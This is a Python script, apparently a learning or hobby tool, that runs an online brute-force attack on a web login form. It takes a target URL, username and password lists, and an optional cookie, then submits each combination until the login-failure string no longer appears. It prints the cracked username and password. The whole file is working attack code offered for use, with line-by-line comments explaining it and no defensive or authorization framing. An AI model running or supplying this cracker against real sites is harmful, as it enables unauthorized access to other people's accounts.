#!/usr/bin/env python3
import requests  # A Python library for sending HTTP requests and handling responses (GET, POST, etc.).
import termcolor  # Library to print colored text and apply text styles in the terminal.
import os  # For checking if a file exists

# Function to collect target and login details from the user
def target_info():
    url = input(termcolor.colored('[+] Enter target url: ', 'blue'))  # Prompt the user to enter the target website's URL and color the prompt blue.
    
    # ---------------------- USERNAME INPUT ----------------------
    user_choice = input(termcolor.colored('[?] Use single username or username list? (single/list): ', 'blue')).strip().lower()  # Ask if the user will use one username or a list; convert input to lowercase for consistency.
    if user_choice == 'list':  # If the user wants to use a list of usernames.
        username_file = input(termcolor.colored('[+] Enter path to username file: ', 'blue'))  # Prompt for the file path to the username list.
        if not os.path.isfile(username_file):  # Check if the provided file exists.
            print(termcolor.colored('[X] Username file not found!', 'red'))  # Print error in red if file is missing.
            return None  # Exit function and return None (invalid input).
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:  # Opens the username file in read mode using UTF-8 encoding, ignoring any characters that can't be decoded to prevent read errors.
            usernames = [line.strip() for line in f if line.strip()]  # Read each line, remove whitespace, and ignore blank lines.
    else:  # If the user wants to enter a single username.
        single_username = input(termcolor.colored('[+] Enter username: ', 'blue')).strip()  # Prompt for the single username and strip extra spaces.
        usernames = [single_username]  # Store it in a list for consistency.

    # ---------------------- PASSWORD INPUT ----------------------
    pass_choice = input(termcolor.colored('[?] Use single password or password list? (single/list): ', 'blue')).strip().lower()  # Ask if the user will use one password or a list; convert input to lowercase.
    if pass_choice == 'list':  # If the user wants to use a list of passwords.
        password_file = input(termcolor.colored('[+] Enter the password file: ', 'blue'))  # Prompt for the password file path.
        if not os.path.isfile(password_file):  # Check if the file exists.
            print(termcolor.colored('[X] Password file not found!', 'red'))  # Print error in red if file is missing.
            return None  # Exit function and return None (invalid input).
    else:  # If the user wants to enter a single password.
        single_password = input(termcolor.colored('[+] Enter password: ', 'blue')).strip()  # Prompt for the single password and strip spaces.
        password_file = 'single_password_tmp.txt'  # Create a temporary file name for the single password.
        with open(password_file, 'w') as f:  # Open the temporary file in write mode.
            f.write(single_password + '\n')  # Write the password into the file followed by a newline.

    login_failed_string = input(termcolor.colored('[+] Enter the string that occurs when login fails: ', 'blue'))  # Prompt the user for the string that indicates a failed login attempt.
    cookie_value = input(termcolor.colored('[+] Enter cookie value (Optional): ', 'blue'))  # Prompt for an optional cookie value.

    return url, usernames, password_file, login_failed_string, cookie_value  # Return all collected details as a tuple.

# ---------------------- Function to attempt password cracking ----------------------
def cracking(usernames, url, password_file, login_failed_string, cookie_value):
    with open(password_file, 'r') as passwords:  # Open the password file for reading.
        for username in usernames:  # Loop through each username.
            passwords.seek(0)  # Reset the file pointer to the beginning so we can reuse the password list for each username.
            for password in passwords:  # Loop through each password in the file.
                password = password.strip()  # Remove any extra spaces or newline characters from the password.
                print(termcolor.colored(f'Trying: {username}:{password}', 'blue'))  # Print the current login attempt in blue.

                data = {'username': username, 'password': password, 'Login': 'submit'}  # Prepare the login form data.

                if cookie_value != '':  # If a cookie value was provided.
                    response = requests.get(url, params=data, cookies={'Cookie': cookie_value})  # Send a GET request with the data and cookie.
                else:  # If no cookie is provided.
                    response = requests.post(url, data=data)  # Send a POST request with the login data.

                if login_failed_string in response.content.decode():  # Check if the login failed string appears in the response.
                    pass  # Do nothing; continue to the next password.
                else:  # If the failed login string is not found, credentials may be correct.
                    print(termcolor.colored('[+] Username found: ' + username, 'green'))  # Print found username in green.
                    print(termcolor.colored('[+] Password found: ' + password, 'green'))  # Print found password in green.
                    return True  # Return True (successful crack).
    return False  # Return False if no credentials matched.

# ---------------------- Main program loop ----------------------
try:
    while True:  # Loop to allow multiple cracking attempts without restarting the program.
        info = target_info()  # Call the function to get target and login details.
        if not info:  # If the function returned None (invalid input or missing file).
            break  # Exit the loop and end the program.
        url, usernames, password_file, login_failed_string, cookie_value = info  # Unpack the returned tuple into variables.
        found = cracking(usernames, url, password_file, login_failed_string, cookie_value)  # Call the cracking function with provided details.

        if not found:  # If no match was found.
            print(termcolor.colored('[X] No match found. Try another list or check inputs.', 'red'))  # Print failure message in red.

except KeyboardInterrupt:  # If the user presses Ctrl+C to stop the program.
    print("\nExiting...")  # Print exit message.
